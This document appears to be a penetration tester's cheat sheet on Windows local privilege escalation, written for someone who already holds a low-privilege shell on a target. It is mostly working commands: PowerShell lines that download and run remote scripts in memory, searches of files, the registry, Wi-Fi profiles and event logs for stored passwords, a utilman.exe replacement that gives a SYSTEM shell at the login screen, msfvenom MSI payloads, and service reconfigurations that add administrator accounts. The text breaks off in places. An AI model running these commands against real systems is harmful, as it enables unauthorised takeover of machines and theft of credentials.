# Windows - Local privilege escalation

The following note assumes that a low privilege shell could be obtained on the
target.

To leverage a shell from a Remote Code Execution (RCE) vulnerability please
refer to the `[General] Shells` note.

“The more you look, the more you see.”  
― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance

### Basic enumeration

The following commands can be used to grasp a better understanding of the
current system:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **OS details**  | systeminfo | [environment]::OSVersion.Version |  |
| **OS Architecture** | echo %PROCESSOR_ARCHITECTURE% |  [Environment]::Is64BitOperatingSystem | wmic os get osarchitecture |
| **Hostname**  | hostname | $env:ComputerName<br/> $env:computername.$env:userdnsdomain <br/> (Get-WmiObject Win32_ComputerSystem).Name ||
| **Curent Domain** | echo %userdomain% | $env:UserDomain<br/>(Get-WmiObject Win32_ComputerSystem).Domain ||
| **Curent User**  | whoami /all<br/>net user %username%  | $env:UserName<br/>(Get-WmiObject Win32_ComputerSystem).UserName | |
| **Local users**  | net users<br/>net users <USERNAME\> | Get-WMIObject Win32_UserAccount -NameSpace "root\CIMV2" -Filter "LocalAccount='$True'" | wmic USERACCOUNT list full |
| **Local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
| **Local group users** | net localgroup Administrators<br/>net localgroup <GROUPNAME\> | | |
| **Connected users** | qwinsta | | |
| **Powershell version**  | Powershell  $psversiontable | $psversiontable ||
| **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
| **Mounted disks** | fsutil fsinfo drives | Get-PSDrive &#124; where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | wmic volume get DriveLetter,FileSystem,Capacity |
| **Writable directories** | dir /a-rd /s /b | | |
| **Writable files** | dir /a-r-d /s /b | | | |

###### Installed .NET framework

A number of tools may require the use of .NET, either for privileges escalation
or post exploitation.

Before .NET 4.0, the installed .NET version can be determined using the
names of the folder in the `\Windows\Microsoft.NET\Framework64\` directory. For
later versions, the `MSBuild.exe` utility, packaged with the .NET  framework,
can be used to establish the precise version installed. If the execution of
`MSBuild.exe` is blocked, the version can still be retrieved manually.

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
.\MSBuild.exe

# .NET 4.5 and later
# The "Release" DWORD key corresponds to the particular version of the .NET Framework installed
# Values of the Release DWORD: https://github.com/dotnet/docs/blob/master/docs/framework/migration-guide/how-to-determine-which-versions-are-installed.md
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# .NET 1.1 through 3.5
# List all install versions (subkeys under NDP)
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\
# Retrieve the "Version" key of the specified .NET installation
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\<VERSION>

# Alternative .NET all versions
# The "FileVersion" property of the .NET installation dlls can be used to determine, through a Google search query, the precise installed version
cd \Windows\Microsoft.NET\Framework64\<VERSION>
Get-Item "Accessibility.dll" | fl
# Or
$file = Get-Item "Accessibility.dll"
[System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion
```

### Enumeration scripts

Most of the enumeration process detailed below can be automated using scripts.

*Personal preference: PowerSploit's `PowerUp.ps1` `Invoke-PrivescAudit` /
`Invoke-AllChecks` + enjoiz's `privesc.bat` or `privesc.ps1` + off-target
`Windows Exploit Suggester - Next Generation`*

To upload the scripts on the target, please refer to the [General] File transfer
note.

Note that PowerShell scripts can be injected directly into memory using
PowerShell `DownloadString` or through a `meterpreter` session:

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>'); <Invoke-CMD>"

PS> IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>')
PS> <Invoke-CMD>

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute <Invoke-CMD>
```

###### PowerSploit's PowerUp

The PowerSploit's PowerUp `Invoke-PrivescAudit` / `Invoke-AllChecks` and
enjoiz's `privesc.bat` or `privesc.ps1`scripts run a number of configuration
checks:
  - Clear text passwords in files or registry  
  - Unquoted services path
  - Weak services permissions
  - "AlwaysInstallElevated" policy
  - Token privileges
  - ...

The `Invoke-PrivescAudit` / `Invoke-AllChecks` cmdlets will run all the checks
implemented by PowerSploit's `PowerUp.ps1`. The script can be either injected
directly into memory as specified above or can be imported using the file.

```
# powershell.exe -nop -exec bypass
# set-executionpolicy bypass

Import-Module <FULLPATH>\PowerUp.ps1

# Older versions
Invoke-AllChecks

Invoke-PrivescAudit
```

###### enjoiz privesc.bat / privesc.ps1

Both the batch and PowerShell versions of the `enjoiz` privilege escalation
script require `accesschk.exe` to present on the targeted machine (on the
script directory). The script takes one or multiple user group(s) as parameter
to test the configuration for. To retrieve the user groups of the compromised
user, the Windows built-in `whoami /groups` can be used.

```
privesc.bat "<USER_GROUP_1>" ["<USER_GROUP_N"]

privesc.bat "Everyone Users" "Authenticated Users"
```   

###### Windows Exploit Suggester - Next Generation

The `WES-NG` script compares a targets patch levels against the Microsoft
vulnerability database in order to detect potential missing patches on the
target. Refer to the `Unpatched system` section below for a detailed usage
guide of the script.  

###### Seatbelt

`Seatbelt` is a C# tool that can be used to enumerate a number of security
mechanisms of the target such as the PowerShell restrictions, audit
and Windows Event Forwarding settings, registered antivirus, firewall
rules, installed patches and last reboot events, etc.

`Seatbelt` can also be used to gather interesting user data such as saved RDP
connections files and putty SSH host keys, AWS/Google/Azure cloud credential
files, browsers bookmarks and histories, etc.   

```
# Conduct system + user checks, with fully detailed results
SeatBelt.exe all full
```

### Physical access privileges escalation

Physical access open up different ways to bypass user login screen and obtain
NT AUTHORITY\SYSTEM access.

###### Hardened system

*BIOS settings*

The methods detailed below require to boot from a live CD/DVD or USB key. The
possibility to do so may be disabled by BIOS settings. To conduct the
attack below, an access to the BIOS or a reset to default settings must be
accomplished.  

Manufacturers may have defined a default BIOS password, some of which are
listed on the following resource
http://www.uktsupport.co.uk/reference/biosp.htm

Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
the motherboard Jumper. The system hard drive can also be plugged on another
computer to extract the SAM base or carry out the process below.  

*Encrypted disk*

The methods detailed below require an access to the Windows file system and will
not work on encrypted partitions if the password to decrypt the file system is
not known.

###### PCUnlocker

`PCUnlocker` is a password-unlocking software that can be used to reset lost
Windows users password. it can be burn on a CD/DVD or installed on a bootable
USB key.

The procedure to create a bootable USB key and reset local Windows users
passwords is as follow:

  1. Download `Rufus` and `PCUnlocker`
  2. Create a bootable USK key using `Rufus` with the `PCUnlocker` ISO.  
     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
     scheme for UEFI computer" option on Rufus
  3. Boot on the USB Key thus created (boot order may need to be changed in
     BIOS)
  4. From the `PCUnlocker` GUI, pick an account and click the "Reset Password"
     button to reset the password to <PASSWORD>

To create a bootable CD/DVD, simply use any CD/DVD burner with the `PCUnlocker`
ISO and follow steps 3 & 4.  
If used on a Domain Controller, `PCUnlocker` can be used to reset Domain users
password by updating the `ntds.dit` file.

###### utilman.exe

The `utilman` utility tool can be launched at the login screen before
authentication as NT AUTHORITY\SYSTEM. By using a Windows installation CD/DVD,
it is possible to replace the `utilman.exe` by `cmd.exe` to gain access to a CMD
shell as SYSTEM without authentication.

The procedure to do so is as follow:

  1. Download the Windows ISO corresponding to the attacked system and burn it
     to a CD/DVD
  2. Boot on the thus created CD/DVD
  3. Pick the "Repair your computer" option
  4. Select the “Use recovery tools [...]" option, pick the operating system
     from the list and click "Next"
  5. A command prompt should open, enter the following commands:
      - cd windows\system32
      - ren utilman.exe utilman.exe.bak
      - copy cmd.exe utilman.exe
  6. Remove the CD/DVD and boot the system normally.
  7. On the login screen, press the key combination Windows Key + U
  8. A command prompt should open with NT AUTHORITY\SYSTEM rights
  9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
  user

### Sensible content

###### Clear text passwords in files

The built-in `findstr` and `dir` can be used to search for clear text passwords
stored in files. The keyword 'password' should be used first and the search
broaden if needed by searching for 'pass'.

The `meterpreter` `search` command can be used in place of `findstr` if a
`meterpreter` shell is being used.

```
# Searche recursively in current folder
dir /s <KEYWORD>

# Meterpreter search command
search -f <FILE_NAME>.<FILE_EXTENSION> <KEYWORD>
search -f *.* <KEYWORD>

# Search 'password' / 'pass' in all txt/xml/ini files
findstr /si "password" *.txt
findstr /si "password" *.xml
findstr /si "password" *.ini
findstr /si "pass" *.txt
findstr /si "pass" *.xml
findstr /si "pass" *.ini

# Search 'password'/'pass' in all files
findstr /spin "password" *.*
findstr /spin "pass" *.*
findstr /spin "savecred" *.*

# Search for runas with savecred in files
findstr /s /i /m "savecred" *.*
findstr /s /i /m "runas" *.*

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*
```

The following files, if present on the system, may contain clear text or base64
encoded passwords and should be reviewed:

```
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattend\Unattend.xml
%WINDIR%\Panther\Unattended.xml
%WINDIR%\Panther\Unattend.xml
%SystemDrive%\sysprep.inf
%SystemDrive%\sysprep\sysprep.xml
%WINDIR%\system32\sysprep\Unattend.xml
%WINDIR%\system32\sysprep\Panther\Unattend.xml
%SystemDrive%\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT
%WINDIR%\panther\setupinfo
%WINDIR%\panther\setupinfo.bak
%SystemDrive%\unattend.xml
%WINDIR%\system32\sysprep.inf
%WINDIR%\system32\sysprep\sysprep.xml
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
%SystemDrive%\inetpub\wwwroot\web.config
%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml
%HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>\LocalState\rootfs\etc\passwd
%HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>\LocalState\rootfs\etc\shadow

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
dir /s /b *tnsnames*
dir /s /b *.ora*
```

###### Cached credentials

Windows-based computers use multiple forms of password caching / storage: local
accounts credentials, domain credentials, and generic credentials:

  - Domain credentials are authenticated by the Local Security Authority (LSA)
    and cached in the LSASS (Local Security Authority Subsystem) process.
  - Local accounts credentials are stored in the SAM (Security Account Manager)
    hive.
  - Generic credentials are defined and authenticated by programs that manage
    authorization and security directly. The generic credentials are cached in
    the Credential Manager.

Local administrator or NT AUTHORITY\SYSTEM privileges are required to access
the clear-text or hashed passwords. Refer to the `[Windows] Post
Exploitation` note for more information on how to retrieve these credentials.

However, stored generic credentials may be directly usable. In particular,
Windows credentials (domain or local accounts) cached as generic credentials in
the Credential Manager, usually done using `runas /savecred`.   

The `cmdkey` and `rundll32.exe` Windows built-ins can be used to enumerate the
generic credentials stored on the machine. Saved Windows credentials be can used
using `runas`.

```
# List stored generic credentials
cmdkey /list
# Require a GUI interface
rundll32.exe keymgr.dll,KRShowKeyMgr

runas /savecred /user:<DOMAIN | WORKGROUP>\<USERNAME> <EXE>
```

###### Cached GPP passwords

GPP can be cached locally and may contain encrypted passwords that can be
decrypted using the Microsoft public AES key.

The `Get-CachedGPPPassword` cmdlet, of the `PowerSploit`'s `PowerUp` script,
can be used to automatically retrieve the cached GPP XML files and extract the
present passwords.

```
Get-CachedGPPPassword
```

The following commands can be used to conduct the search manually:

```
$AllUsers = $Env:ALLUSERSPROFILE
# If $AllUsers do not contains "ProgramData"
$AllUsers = "$AllUsers\Application Data"

Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml',
'DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue | Select-String -pattern "cpassword"
```

The Ruby `gpp-password` script can be used to decrypt a GPP password:

```
gpp-decrypt <ENC_PASSWORD>
```

###### Clear text password in registry

Passwords may also be stored in Windows registry:

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
```

###### Wifi passwords

The configured / memorized Wifi passwords on the target machine may be
retrievable as an unprivileged user using the Windows built-in `netsh`:

```
# List stored Wifi
netsh wlan show profiles

# Retrieve information about the specified Wifi, including its clear text password if available
netsh wlan show profile name="<WIFI_NAME>" key=clear
```

###### Passwords in Windows event logs

If the compromised user can read Windows events logs, by being a member
of the `Event Log Readers` notably, and the command-line auditing feature is
enabled, the logs should be reviewed for sensible information.

```
# Check if command-line auditing is enabled - may return false-negative
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled

# List available Windows event logs type and number of entries
Get-EventLog -List

Get-EventLog -LogName <System | Security | ...> | Select -Property * -ExpandProperty Message

wevtutil qe <System | Security | ...> /f:text /rd:true

# specifying an host allows to specify an user to run the query as
wevtutil qe <System | Security | ...> /r:<127.0.0.1 | HOSTNAME | IP> /u:<WORKGROUP | DOMAIN>\<USERNAME> /p:<* | PASSWORD> /f:text /rd:true
```

###### Hidden files

To display only hidden files, the following command can be used:

```
dir /s /ah /b
dir C:\ /s /ah /b

# PowerShell
ls -r
Get-Childitem -Recurse -Hidden
```

###### Files of interest

The following files may contains sensible information:

```
# PowerShell commands history
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# WSL directory - For more information refer to Windows Subsystem for Linux (WSL) below
%HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>
```

######  Alternate data streams (ADS)

The NTFS file system includes support for ADS, allowing files to contain more
than one stream of data. Every Windows file has at least one data stream,
called by default `:$DATA`.

ADS do not appear in Windows Explorer, and their size is not included in the
size of the file that hosts them. Moreover, only the main stream of a file is
retained when copying to a FAT file system, attaching to a mail or
uploading to a website. Because of these properties, ADS may be used by users
or applications to store sensible information and the eventual ADS present on
the system should be reviewed.

DOS and PowerShell built-ins as well as `streams.exe` from the Sysinternals
suite and tools from
http://www.flexhex.com/docs/articles/alternate-streams.phtml can be used to
operate with ADS.

Note that the PowerShell cmdlets presented below are only available starting
from `PowerShell 3`.

```
# Search ADS
dir /R <DIRECTORY | FILE_NAME>
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$DATA'
Get-Item <FILE_NAME> -stream *
streams.exe -accepteula -s <DIRECTORY>
streams.exe -accepteula <FILE_NAME>

# Retrieve ADS content
more < <FILE_NAME>:<ADS_NAME>
Get-Content <FILE_NAME> -stream <ADS_NAME>
LS.exe <FILE_NAME>

# Write ADS content
echo "<INPUT>" > <FILE_NAME>:<ADS_NAME>
Set-Content <FILE_NAME> -stream <ADS_NAME> -Value "<INPUT>"
Add-Content <FILE_NAME> -stream <ADS_NAME> -Value "<INPUT>"

# Remove ADS
Remove-Item –path <FILE_PATH> –stream <ADS_NAME>
streams.exe -accepteula -d <FILE_NAME>
```

### Unpatched system

###### OS and Kernel version

The following commands or actions can be used to get the updates installed on
the host:

| DOS | Powershell | WMI |
|-----|------------|-----|
| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix<br/> Get-WindowsUpdateLog | wmic qfe get HotFixID,InstalledOn,Description |

Automatically compare the system patch level to public known exploits:

###### Exploits detection tools

*Windows Exploit Suggester - Next Generation (WES-NG)*

-- Replace Windows-Exploit-Suggester --

The `WES-NG` Python script compares a target patch level, retrieved using
`systeminfo`, and the Microsoft vulnerability database in order to detect
potential missing patches on the target.

```
wes.py --update

wes.py <SYSTEMINFO_FILE>
```

*Windows-Exploit-Suggester (outdated) *

Outdated: Microsoft replaced the Microsoft Security Bulletin Data Excel
file, on which Windows-Exploit-Suggester is fully dependent, by the MSRC API.
The Microsoft Security Bulletin Data Excel file has not been updated since Q1
2017, so later operating systems and vulnerabilities can no longer be
assessed --

The `windows-exploit-suggester` script compares a targets patch levels against
the Microsoft vulnerability database in order to detect potential missing
patches on the target.  
It also notifies the user if there are public exploits and `Metasploit` modules
available for the missing bulletins.  
It requires the `systeminfo` command output from a Windows host in order to
compare that the Microsoft security bulletin database and determine the patch
level of the host.  
It has the ability to automatically download the security bulletin database
from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

```
# python windows-exploit-suggester.py --update

python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO_FILE>
```

If the `systeminfo` command reveals 'File 1' as the output for the hotfixes,
the output of `wmic qfe list full` should be used instead using the --hotfixes
flag, along with the `systeminfo`:

```
python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
```

*Watson*

`Watson` (replaces `Sherlock`) is a .NET tool designed to enumerate missing KBs
and suggest exploits. Only works on Windows 10 (1703, 1709, 1803 & 1809) and
Windows Server 2016 & 2019.

`Watson` must be compiled for the .NET version supported on the target.

```
```

*Sherlock (outdated)*

Outdated: Microsoft changed to rolling patches on Windows instead of hotfixes
per vulnerability, making the detection mechanism of `Sherlock` non functional.

PowerShell script to find missing software patches for critical vulnerabilities
that could be leveraged for local privilege escalation.

To download and execute directly into memory:

```
# CMD
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
```

*(Metasploit) Local Exploit Suggester (outdated)*

The `local_exploit_suggester` module suggests local `meterpreter` exploits that
can be used against the target, based on the architecture and platform as well as
the available exploits in `meterpreter`.

 ```
meterpreter> run post/multi/recon/local_exploit_suggester

# OR

msf> use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session-id>
msf post(local_exploit_suggester) > run
```

###### Pre compiled exploits

A collection of pre compiled Windows kernel exploits can be found on the
`windows-kernel-exploits` GitHub repository. Use at your own risk.

```
https://github.com/SecWiki/windows-kernel-exploits
```

###### Compilers

*mingw*

An exploit in C can be compiled on Linux to be used on a Windows system using
the cross-compiler `mingw`:

```
# 32 bits
i686-w64-mingw32-gcc -o exploit.exe exploit.c

# 64 bits
x86_64-w64-mingw32-gcc -o exploit.exe exploit.c
```

*PyInstaller*

If an exploit is only available as a Python script and Python is not installed
on the target, `PyInstaller` can be used to compile a stand alone executable of
the Python script:

```
pyinstaller --onefile <SCRIPT>.py
```

`PyInstaller` should be used on a Windows operating system.

### AlwaysInstallElevated policy

Windows provides a mechanism which allows unprivileged user to install Windows
installation packages, Microsoft Windows Installer Package (MSI) files,
with NT AUTHORITY\SYSTEM privileges. This policy is known as
`AlwaysInstallElevated`.

If activated, this mechanism can be leveraged to elevate privileges on the
system by executing code through the MSI during the installation process as
NT AUTHORITY\SYSTEM.    

The Windows built-in `req query` and the the `Powershell` `PowerUp` script can
be used to check whether the `AlwaysInstallElevated` policy is deployed on the
host be querying the registry:

```
# If "REG_DWORD 0x1" is returned the policy is activated
# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
PS> Get-RegistryAlwaysInstallElevated

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-RegistryAlwaysInstallElevated
```

The policy can be abused through a `meterpreter` session using the `Metasploit`
module `exploit/windows/local/always_install_elevated`, by crafting a MSI with
`msfvenom` or using the `Powershell` `PowerUp` script.

Note that the `Metasploit` module
`exploit/windows/local/always_install_elevated` will prevent the installation
from succeeding to avoid the registration of the program on the system.  

```
# Requires a meterpreter session
msf> use exploit/windows/local/always_install_elevated

# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary  
# Refer to the "[General] Shells" note for generating binaries that can bypass anti-virus detection
# Refer to the "[General] File transfer" note for file transfer techniques to upload the MSI on the targeted system

msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>

# /quiet: no messages displayed, /qn: no GUI, /i runs as current user
msiexec /quiet /qn /i <MSI_PATH>

# (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
# Prompt a GUI interface to specify the user to be added
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Write-UserAddMSI
```

### Services misconfigurations

In Windows NT operating systems, a Windows service is a computer program that
operates in the background, similarly in concept to a Unix daemon.

A Windows service must conform to the interface rules and protocols of the
`Service Control Manager`, the component responsible for managing Windows
services. Windows services can be configured to start with the operating
system, manually or when an event occur.

Vulnerabilities in a service configuration could be exploited to execute code
under the privileges of the user starting the service, often
`NT AUTHORITY\SYSTEM`.

###### Windows services enumeration

The Windows built-ins `sc` and `wmic` can be used to enumerate the services configured on
the target system:

```
# List services
Get-WmiObject -Class win32_service | Select-Object Name, DisplayName, PathName, StartName, StartMode, State, TotalSessions, Description
wmic service list config
sc query

# Service config
sc qc <SERVICE_NAME>

# Service status / extended status
sc query <SERVICE_NAME>
sc queryex <SERVICE_NAME>
```

###### Weak services permissions

A weak service permissions vulnerability occurs when an unprivileged user can
alter the service configuration so that the service runs a specified command or
executable.  

The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
`PowerUp` script can be used to list the services an user can exploit:

```
# List services that configure permissions for the "Everyone" / "Tout le monde" user groups
accesschk.exe -accepteula -uwcqv "Everyone" *
accesschk64.exe -accepteula -uwcqv "Everyone" *
accesschk.exe -accepteula -uwcqv "Tout le monde" *
accesschk64.exe -accepteula -uwcqv "Tout le monde" *

# List services that configure permissions for the specified user
accesschk.exe -accepteula -uwcqv <USERNAME> *
accesschk64.exe -accepteula -uwcqv <USERNAME> *

# Enumerate all services and their permissions configuration
accesschk.exe -accepteula -uwcqv *
accesschk64.exe -accepteula -uwcqv *

# Retrieve permissions configuration for the specified service
accesschk64.exe -accepteula -uwcqv <SERVICE_NAME>

# (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
# Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
# Get-ModifiableService - returns services the current user can reconfigure
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
PS> Get-ModifiableServiceFile
PS> Get-ModifiableService

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-ModifiableServiceFile
meterpreter> powershell_execute Get-ModifiableService
```

If the tools above are not a possibility, the Windows built-in `sc` can be used
to directly retrieve a service's security descriptor composed of the System
Access Control List and (SACL) and Discretionary Access Control List (DACL).

```
sc sdshow <SERVICE_NAME>
```

The security descriptor, as displayed by `sc sdshow`, is formatted according
the Security Descriptor Definition Language (SDDL) and will usually be divided
into two parts:
  - Prefix of S: SACL and controls auditing
  - Prefix of D: DACL and controls permissions

The SDDL uses Access Control Entry (ACE) strings in the DACL and SACL
components of a security descriptor string. Each ACE in a security descriptor
string is enclosed in parentheses in which an user account and their associated
permissions are represented.

The fields of the ACE are in the following order and are separated by
semicolons (;)

```
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
```

In case of services, the fields `ace_type`, `rights` and `account_sid` are
usually the only ones being set.

The `ace_type` field is usually either set to Allow (A) or Deny (D). The
`rights` field is a string that indicates the access rights controlled by
the ACE, usually composed of pair of letters each representing a specific
permission. Finally, the `account_sid` represent the security principal
assigned with the permissions and can either be a two letters known alias or a
SID.

The following known aliases can be encountered:

| Alias | Name |
|-------|-----------------------------------------|
| AO | Account operators |
| RU | Alias to allow previous Windows 2000 |
| AN | Anonymous logon |
| AU | Authenticated users |
| BA | Built-in administrators |
| BG | Built-in guests |
| BO | Backup operators |
| BU | Built-in users |
| CA | Certificate server administrators |
| CG | Creator group |
| CO | Creator owner |
| DA | Domain administrators |
| DC | Domain computers |
| DD | Domain controllers |
| DG | Domain guests |
| DU | Domain users |
| EA | Enterprise administrators |
| ED | Enterprise domain controllers |
| WD | Everyone |
| PA | Group Policy administrators |
| IU | Interactively logged-on user |
| LA | Local administrator |
| LG | Local guest |
| LS | Local service account |
| SY | Local system |
| NU | Network logon user |
| NO | Network configuration operators |
| NS | Network service account |
| PO | Printer operators |
| PS | Personal self |
| PU | Power users |
| RS | RAS servers group |
| RD | Terminal server users |
| RE | Replicator |
| RC | Restricted code |
| SA | Schema administrators |
| SO | Server operators |
| SU | Service logon user |

The following permissions are worth mentioning in the prospect of local
privilege escalation:


| Ace's rights | Access right | Description |
|--------------|--------------|-------------|
| CC | SERVICE_QUERY_CONFIG | Retrieve the service's current configuration from the SCM |
| DC | SERVICE_CHANGE_CONFIG | Change the service configuration, notably grant the right to change the executable file associated with the service |
| GA | GENERIC_ALL | Read, write and execute access to the service |
| GX | GENERIC_WRITE | Write access to the service |
| LC | SERVICE_QUERY_STATUS | Retrieve the service's current status from the SCM |
| LO | SERVICE_INTERROGATE | Retrieve the service's current status directly from the service itself |
| RC | READ_CONTROL | Read the security descriptor of the service |
| RP | SERVICE_START | Start the service |
| SW | SERVICE_ENUMERATE_DEPENDENTS | List the services that depend on the service |
| WD | WRITE_DAC | Modify the DACL of the service in its security descriptor |
| WO | WRITE_OWNER | Change the owner of the service in its security descriptor |
| WP | SERVICE_STOP | Stop the service |
| - | SERVICE_ALL_ACCESS | Include all service permissions, notably SERVICE_CHANGE_CONFIG |

The full list can be re
To alter the service configuration:

```
# A space is required after binPath=
sc config <SERVICE_NAME> binPath= "net user <USERNAME> <PASSWORD> /add"
sc config <SERVICE_NAME> binPath= "net localgroup administrators <USERNAME> /add"
sc config <SERVICE_NAME> binPath= "<NEW_BIN_PATH>"

# If needed, start the service under Local Service account
sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
sc config <SERVICE_NAME> obj= "\Local Service" password= ""
sc config <SERVICE_NAME> obj="NT AUTHORITY\LocalService" password= ""
```

The `Metasploit` module `exploit/windows/local/service_permissions` can be used
through an existing `meterpreter` session to automatically detect and exploit
weak services permissions to execute a specified payload under NT
AUTHORITY\SYSTEM privileges.

###### Unsecure NTFS permissions on service binaries

Permissive NTFS permissions on the service binary used by the service can be
leveraged to elevate privileges on the system as the user running the service.

If available, the Windows utility `wmic` can be used to retrieve all services
binary paths:

```
wmic service list full | findstr /i "PathName" | findstr /i /v "System32"

Get-WmiObject -Class win32_service -Property PathName | Ft PathName
Get-WmiObject -Class win32_service -Property PathName | Where-Object { $_.PathName -NotMatch "system32"} | Ft PathName
```

The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
the services binary:

```
icacls <BINARY_PATH>
```

###### Unquoted service binary paths

When a service path is unquoted, the Service Manager will try to find the
service binary in the shortest path, moving up to the longest path until one
works.     
For example, for the path C:\TEST\Service Folder\binary.exe, the space
is treated as an optional path to explore for that service. The resolution
process will first look into C:\TEST\ for the Service.exe binary and, if it
exist, use it to start the service.  

Here is Windows’ chain of thought for the above example:

1. Are they asking me to run  
   "C:\TEST\Service.exe" Folder\binary.exe  
   No, it does not exist.

2. Are they asking me to run  
   "C:\TEST\Service Folder\Service_binary.exe"  
   Yes, it does exist.

In summary, a service is vulnerable if the path to the executable contains
spaces and is not wrapped in quote marks. Exploitation requires write
permissions to the path before the quote mark. Note that unquoted path
for services in `C:\Program Files` and `C:\Program Files (x86)` are usually
not exploitable as unprivileged user rarely have write access in the `C:\` root
directory or in the standard program directories.

In the above example, if an attacker has write privilege in C:\TEST\, he could create
a C:\Service.exe and escalate its privileges to the level of the account that
starts the service.

To find vulnerable services the `wmic` tool and the `Powershell` `PowerUp`
script can be used as well as a manual review of each service metadata using
`sc` queries:

```
# wmic
wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
wmic service get PathName, StartMode | findstr /i /v """
wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
wmic service get name.pathname,startmode | findstr /i /v """

Get-WmiObject -Class win32_service -Property PathName | Where-Object { $_.PathName -NotMatch "system32" -And $_.PathName -NotMatch '"' } | Ft PathName

# (PowerShell) PowerSploit's PowerUp Get-ServiceUnquoted
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Get-UnquotedService

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-ServiceUnquoted
```

The `Metasploit` module `exploit/windows/local/trusted_service_path` can be used
through an existing `meterpreter` session to automatically detect and exploit
unquoted service path to execute a specified payload under `NT AUTHORITY\SYSTEM`
privileges.

######  Windows XP SP0 & SP1

On Windows XP SP0 and SP1, the Windows service `upnphost` is run by
